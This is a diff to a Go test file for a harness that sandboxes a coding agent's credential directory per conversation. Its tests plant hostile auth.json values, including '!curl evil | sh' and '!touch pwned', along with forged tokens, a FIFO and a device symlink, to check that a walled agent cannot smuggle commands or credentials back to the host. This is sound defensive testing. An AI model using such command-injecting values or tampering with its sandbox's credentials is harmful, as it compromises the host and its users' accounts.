@@ -1,11 +1,13 @@
 package harness
 
 import (
+	"bytes"
 	"encoding/base64"
 	"encoding/json"
 	"os"
 	"path/filepath"
 	"strings"
+	"syscall"
 	"testing"
 	"time"
 
@@ -38,7 +40,7 @@ func TestPreparePiWalledAgentDirRebuildsFromTheHost(t *testing.T) {
 	require.NoError(t, os.WriteFile(filepath.Join(host, "settings.json"), []byte(`{}`), 0o600))
 	require.NoError(t, os.WriteFile(filepath.Join(host, "custom-theme.json"), []byte(`{}`), 0o600))
 
-	walled, err := PreparePiWalledAgentDir()
+	walled, err := PreparePiWalledAgentDir(piTestConversation)
 	require.NoError(t, err)
 	assert.NotEqual(t, host, walled)
 	assert.Equal(t, piReadAuth(t, filepath.Join(host, "auth.json")), piReadAuth(t, filepath.Join(walled, "auth.json")))
@@ -56,7 +58,7 @@ func TestPreparePiWalledAgentDirRebuildsFromTheHost(t *testing.T) {
 	piWriteAuth(t, filepath.Join(walled, "auth.json"), `{"openai":{"type":"api_key","key":"!touch pwned"}}`)
 	require.NoError(t, os.WriteFile(filepath.Join(walled, "crashes.json"), []byte(`[]`), 0o600))
 
-	_, err = PreparePiWalledAgentDir()
+	_, err = PreparePiWalledAgentDir(piTestConversation)
 	require.NoError(t, err)
 	target, err := os.Readlink(filepath.Join(walled, "settings.json"))
 	require.NoError(t, err)
@@ -94,7 +96,7 @@ func TestSyncPiWalledAuthCarriesOnlyRefreshedLogins(t *testing.T) {
 	raw, err := json.Marshal(hostAuth)
 	require.NoError(t, err)
 	piWriteAuth(t, filepath.Join(host, "auth.json"), string(raw))
-	walled, err := PreparePiWalledAgentDir()
+	walled, err := PreparePiWalledAgentDir(piTestConversation)
 	require.NoError(t, err)
 
 	// Inside the wall: pi refreshed openai-codex; an agent planted a command
@@ -107,7 +109,7 @@ func TestSyncPiWalledAuthCarriesOnlyRefreshedLogins(t *testing.T) {
 		"anthropic": {"type":"api_key","key":"!curl evil | sh"},
 		"google": {"type":"oauth","access":"forged","refresh":"f","expires":99999}
 	}`)
-	require.NoError(t, SyncPiWalledAuth())
+	require.NoError(t, SyncPiWalledAuth(nil))
 
 	got := piReadAuth(t, filepath.Join(host, "auth.json"))
 	assert.Equal(t, piCodexToken("acct", "2"), got["openai-codex"]["access"])
@@ -160,13 +162,13 @@ func TestSyncPiWalledAuthFollowsRecordedHostDirectories(t *testing.T) {
 	require.NoError(t, os.MkdirAll(host, 0o700))
 	piWriteAuth(t, filepath.Join(host, "auth.json"),
 		`{"openai-codex":{"type":"oauth","access":"`+piCodexToken("acct", "1")+`","refresh":"r1","expires":1000}}`)
-	walled, err := PreparePiWalledAgentDir()
+	walled, err := PreparePiWalledAgentDir(piTestConversation)
 	require.NoError(t, err)
 	piWriteAuth(t, filepath.Join(walled, "auth.json"),
 		`{"openai-codex":{"type":"oauth","access":"`+piCodexToken("acct", "2")+`","refresh":"r2","expires":2000}}`)
 
 	t.Setenv(PiAgentDirEnvVar, filepath.Join(t.TempDir(), "elsewhere"))
-	require.NoError(t, SyncPiWalledAuth())
+	require.NoError(t, SyncPiWalledAuth(nil))
 	assert.Equal(t, "r2", piReadAuth(t, filepath.Join(host, "auth.json"))["openai-codex"]["refresh"])
 }
 
@@ -176,7 +178,7 @@ func TestPreparePiWalledAgentDirRebuildsPastAHeldWalledLock(t *testing.T) {
 	host := piTestAgentDir(t)
 	require.NoError(t, os.MkdirAll(host, 0o700))
 	piWriteAuth(t, filepath.Join(host, "auth.json"), `{"openai":{"type":"api_key","key":"sk-host"}}`)
-	walled, err := PreparePiWalledAgentDir()
+	walled, err := PreparePiWalledAgentDir(piTestConversation)
 	require.NoError(t, err)
 	piWriteAuth(t, filepath.Join(walled, "auth.json"), `{"openai":{"type":"api_key","key":"!touch pwned"}}`)
 	lock := filepath.Join(walled, "auth.json.lock")
@@ -195,7 +197,7 @@ func TestPreparePiWalledAgentDirRebuildsPastAHeldWalledLock(t *testing.T) {
 		}
 	}()
 
-	_, err = PreparePiWalledAgentDir()
+	_, err = PreparePiWalledAgentDir(piTestConversation)
 	require.NoError(t, err)
 	assert.Equal(t, "sk-host", piReadAuth(t, filepath.Join(walled, "auth.json"))["openai"]["key"])
 }
@@ -209,4 +211,119 @@ func TestPiSpawnerExportsTheWalledAgentDirLast(t *testing.T) {
 	})
 	assert.Greater(t, strings.LastIndex(cmd, "PI_CODING_AGENT_DIR=/walled"), strings.Index(cmd, "PRELAUNCH"))
 	assert.NotContains(t, piSpawner{}.BuildCommand(SpawnSpec{}), PiAgentDirEnvVar)
+}
+
+const piTestConversation = "11111111-2222-4333-8444-555555555555"
+
+// Each conversation has its own walled directory, so what one walled agent
+// plants in its copy never reaches another's pi.
+func TestPiWalledAgentDirIsPerConversation(t *testing.T) {
+	host := piTestAgentDir(t)
+	require.NoError(t, os.MkdirAll(host, 0o700))
+	piWriteAuth(t, filepath.Join(host, "auth.json"), `{"openai":{"type":"api_key","key":"sk-host"}}`)
+	a, err := PreparePiWalledAgentDir("aaaaaaaa-0000-4000-8000-00000000000a")
+	require.NoError(t, err)
+	b, err := PreparePiWalledAgentDir("bbbbbbbb-0000-4000-8000-00000000000b")
+	require.NoError(t, err)
+	assert.NotEqual(t, a, b)
+
+	piWriteAuth(t, filepath.Join(a, "auth.json"), `{"openai":{"type":"api_key","key":"!touch pwned"}}`)
+	assert.Equal(t, "sk-host", piReadAuth(t, filepath.Join(b, "auth.json"))["openai"]["key"])
+
+	for _, bad := range []string{"../x", "a/b", ".", "-x", ""} {
+		_, err := PreparePiWalledAgentDir(bad)
+		assert.Error(t, err, bad)
+	}
+}
+
+// The daemon removes a walled directory once its conversation has no session,
+// and keeps a live one and one prepared too recently to have a session yet.
+func TestSyncPiWalledAuthRemovesDirectoriesOfEndedConversations(t *testing.T) {
+	host := piTestAgentDir(t)
+	require.NoError(t, os.MkdirAll(host, 0o700))
+	piWriteAuth(t, filepath.Join(host, "auth.json"), `{}`)
+	const ended, live, fresh = "eeeeeeee-0000-4000-8000-00000000000e", "11111111-0000-4000-8000-000000000001", "ffffffff-0000-4000-8000-00000000000f"
+	dirs := map[string]string{}
+	for _, conversation := range []string{ended, live, fresh} {
+		dir, err := PreparePiWalledAgentDir(conversation)
+		require.NoError(t, err)
+		dirs[conversation] = dir
+	}
+	records, err := piWalledAgentRecords()
+	require.NoError(t, err)
+	old := time.Now().Add(-2 * piWalledAgentGrace)
+	for _, conversation := range []string{ended, live} {
+		require.NoError(t, os.Chtimes(filepath.Join(records, piHostKey(host)+"-"+conversation), old, old))
+	}
+
+	require.NoError(t, SyncPiWalledAuth(func(conversation string) bool { return conversation == live }))
+	assert.NoDirExists(t, dirs[ended])
+	assert.NoFileExists(t, filepath.Join(records, piHostKey(host)+"-"+ended))
+	assert.DirExists(t, dirs[live])
+	assert.DirExists(t, dirs[fresh])
+}
+
+// A walled agent controls its copy: a FIFO, a link to a device or an outsized
+// file in place of auth.json neither hangs nor exhausts the daemon's sync.
+func TestSyncPiWalledAuthSurvivesAHostileWalledCopy(t *testing.T) {
+	host := piTestAgentDir(t)
+	require.NoError(t, os.MkdirAll(host, 0o700))
+	piWriteAuth(t, filepath.Join(host, "auth.json"), `{"openai":{"type":"api_key","key":"sk-host"}}`)
+	walled, err := PreparePiWalledAgentDir(piTestConversation)
+	require.NoError(t, err)
+	copyPath := filepath.Join(walled, "auth.json")
+
+	plant := map[string]func() error{
+		"fifo": func() error { return syscall.Mkfifo(copyPath, 0o600) },
+		"link": func() error { return os.Symlink("/dev/zero", copyPath) },
+		"huge": func() error {
+			return os.WriteFile(copyPath, bytes.Repeat([]byte(" "), piAuthMaxBytes+1), 0o600)
+		},
+	}
+	for name, fn := range plant {
+		require.NoError(t, os.Remove(copyPath), name)
+		require.NoError(t, fn(), name)
+		done := make(chan error, 1)
+		go func() { done <- SyncPiWalledAuth(nil) }()
+		select {
+		case err := <-done:
+			require.NoError(t, err, name)
+		case <-time.After(10 * time.Second):
+			t.Fatalf("%s: the sync hung", name)
+		}
+		assert.Equal(t, "sk-host", piReadAuth(t, filepath.Join(host, "auth.json"))["openai"]["key"], name)
+		require.NoError(t, os.RemoveAll(copyPath), name)
+		piWriteAuth(t, copyPath, `{}`)
+	}
+}
+
+// A carried-back refresh replaces only its own entry: entries tclaude cannot
+// read are kept as they are, and a linked auth.json is written through its
+// link, which stays a link.
+func TestSyncPiWalledAuthKeepsWhatItCannotReadAndWritesThroughALink(t *testing.T) {
+	host := piTestAgentDir(t)
+	require.NoError(t, os.MkdirAll(host, 0o700))
+	dotfiles := filepath.Join(filepath.Dir(host), "dotfiles-auth.json")
+	piWriteAuth(t, dotfiles, `{
+		"openai-codex": {"type":"oauth","access":"`+piCodexToken("acct", "1")+`","refresh":"r1","expires":1000},
+		"future": {"type":"oauth","access":{"nested":true},"refresh":"z","expires":"soon"},
+		"odd": [1,2,3]
+	}`)
+	require.NoError(t, os.Symlink(dotfiles, filepath.Join(host, "auth.json")))
+	walled, err := PreparePiWalledAgentDir(piTestConversation)
+	require.NoError(t, err)
+	piWriteAuth(t, filepath.Join(walled, "auth.json"),
+		`{"openai-codex":{"type":"oauth","access":"`+piCodexToken("acct", "2")+`","refresh":"r2","expires":2000}}`)
+	require.NoError(t, SyncPiWalledAuth(nil))
+
+	info, err := os.Lstat(filepath.Join(host, "auth.json"))
+	require.NoError(t, err)
+	assert.NotZero(t, info.Mode()&os.ModeSymlink, "the link stays a link")
+	raw, err := os.ReadFile(dotfiles)
+	require.NoError(t, err)
+	var got map[string]json.RawMessage
+	require.NoError(t, json.Unmarshal(raw, &got))
+	assert.Contains(t, string(got["openai-codex"]), `"r2"`)
+	assert.JSONEq(t, `{"type":"oauth","access":{"nested":true},"refresh":"z","expires":"soon"}`, string(got["future"]))
+	assert.JSONEq(t, `[1,2,3]`, string(got["odd"]))
 }
